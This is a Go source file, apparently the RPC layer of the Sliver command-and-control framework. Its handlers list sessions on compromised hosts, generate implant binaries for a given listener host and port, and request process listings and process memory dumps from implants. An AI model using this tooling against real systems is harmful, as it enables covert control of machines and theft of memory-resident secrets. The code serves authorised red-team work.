package rpc

import (
	"io/ioutil"
	"log"
	"path"
	pb "sliver/protobuf/client"
	"sliver/server/core"
	"sliver/server/generate"
	"time"

	sliverpb "sliver/protobuf/sliver"

	"github.com/golang/protobuf/proto"
)

func rpcSessions(_ []byte, resp RPCResponse) {
	sessions := &pb.Sessions{}
	if 0 < len(*core.Hive.Slivers) {
		for _, sliver := range *core.Hive.Slivers {
			sessions.Slivers = append(sessions.Slivers, &pb.Sliver{
				ID:            int32(sliver.ID),
				Name:          sliver.Name,
				Hostname:      sliver.Hostname,
				Username:      sliver.Username,
				UID:           sliver.UID,
				GID:           sliver.GID,
				OS:            sliver.Os,
				Arch:          sliver.Arch,
				Transport:     sliver.Transport,
				RemoteAddress: sliver.RemoteAddress,
				PID:           sliver.PID,
				Filename:      sliver.Filename,
			})
		}
	}
	data, err := proto.Marshal(sessions)
	if err != nil {
		log.Printf("Error encoding rpc response %v", err)
	}
	resp(data, err)
}

func rpcGenerate(req []byte, resp RPCResponse) {
	genReq := &pb.GenerateReq{}
	err := proto.Unmarshal(req, genReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	fpath, err := generate.ImplantBinary(genReq.OS, genReq.Arch, genReq.LHost, uint16(genReq.LPort), genReq.DNSParent, genReq.Debug)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	filename := path.Base(fpath)
	filedata, err := ioutil.ReadFile(fpath)
	generated := &pb.Generate{
		File: &pb.File{
			Name: filename,
			Data: filedata,
		},
	}
	data, err := proto.Marshal(generated)
	resp(data, err)
}

func rpcPs(req []byte, resp RPCResponse) {
	psReq := &sliverpb.PsReq{}
	err := proto.Unmarshal(req, psReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := (*core.Hive.Slivers)[int(psReq.SliverID)]
	if sliver == nil {
		resp([]byte{}, err)
		return
	}

	data, _ := proto.Marshal(&sliverpb.PsReq{})
	data, err = sliver.Request(sliverpb.MsgPsListReq, defaultTimeout, data)
	resp(data, err)
}

func rpcProcdump(req []byte, resp RPCResponse) {
	procdumpReq := &sliverpb.ProcessDumpReq{}
	err := proto.Unmarshal(req, procdumpReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := (*core.Hive.Slivers)[int(procdumpReq.SliverID)]
	if sliver == nil {
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&sliverpb.ProcessDumpReq{
		Pid: procdumpReq.Pid,
	})
	timeout := time.Duration(procdumpReq.Timeout) * time.Second
	data, err = sliver.Request(sliverpb.MsgProcessDumpReq, timeout, data)
	resp(data, err)
}
